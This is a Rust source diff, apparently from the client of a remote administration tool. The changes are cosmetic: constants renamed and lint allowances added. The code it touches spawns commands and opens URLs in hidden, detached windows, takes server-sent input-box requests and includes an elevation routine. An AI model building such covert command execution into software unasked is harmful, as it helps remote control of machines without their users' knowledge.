@@ -6,7 +6,6 @@ use std::os::windows::{process::CommandExt, ffi::OsStrExt};
 use winapi::um::{shellapi::ShellExecuteW, winuser};
 use winapi::um::winuser::SW_HIDE;
 use winapi::shared::minwindef::UINT;
-use winapi::um::wingdi::LOGBRUSH;
 
 use crate::service::install::is_elevated;
 use common::packets::{MessageBoxData, VisitWebsiteData, InputBoxData, ServerboundPacket};
@@ -39,14 +38,14 @@ pub fn visit_website(
     let url = visit_data.url.as_str();
 
     const DETACH: u32 = 0x00000008;
-    const HIDE: u32 = 0x08000000;
+    const HIDE_FLAG: u32 = 0x08000000;
 
     if visit_type == "normal" {
         //println!("Opening URL: {}", url);
         std::process::Command
             ::new("cmd")
             .args(["/C", "start", url])
-            .creation_flags(HIDE | DETACH)
+            .creation_flags(HIDE_FLAG | DETACH)
             .spawn()
             .unwrap();
     }
@@ -118,7 +117,7 @@ pub fn elevate_client() {
     }
 }
 
-const HIDE: u32 = 0x08000000;
+const HIDE_CMD: u32 = 0x08000000;
 
 pub fn system_commands(command: &str) {
     
@@ -133,7 +132,7 @@ pub fn system_commands(command: &str) {
 pub fn run_command(command: &str, args: &[&str]) {
     let _ = std::process::Command
         ::new(command)
-        .creation_flags(HIDE)
+        .creation_flags(HIDE_CMD)
         .args(args)
         .spawn()
         .expect("Failed to run command").wait();
@@ -157,7 +156,10 @@ pub fn handle_input_command(data: InputBoxData) {
             }
 
             unsafe {
-                INPUT_TEXT = [0; 256]; // Clear input buffer
+                #[allow(static_mut_refs)]
+                {
+                    INPUT_TEXT = [0; 256]; // Clear input buffer
+                }
             }
         }
     });
@@ -208,6 +210,7 @@ fn show_input_box(title: String, description: String) -> String {
             DispatchMessageA(&msg);
         }
 
+        #[allow(static_mut_refs)]
         std::str::from_utf8(&INPUT_TEXT)
             .unwrap_or("")
             .trim_end_matches('\0')
@@ -298,11 +301,12 @@ unsafe extern "system" fn wnd_proc(
             );
         }
         WM_COMMAND => {
-            let wm_id = LOWORD(wparam as DWORD) as usize;
+            let wm_id = loword(wparam as DWORD) as usize;
             match wm_id {
                 2 => {
                     // OK clicked
                     let h_edit = GetDlgItem(hwnd, 1);
+                    #[allow(static_mut_refs)]
                     GetWindowTextA(h_edit, INPUT_TEXT.as_mut_ptr() as *mut i8, 256);
                     DestroyWindow(hwnd);
                 }
@@ -323,6 +327,6 @@ unsafe extern "system" fn wnd_proc(
 }
 
 // Helper: extract low word
-fn LOWORD(l: DWORD) -> WORD {
+fn loword(l: DWORD) -> WORD {
     (l & 0xffff) as WORD
 }
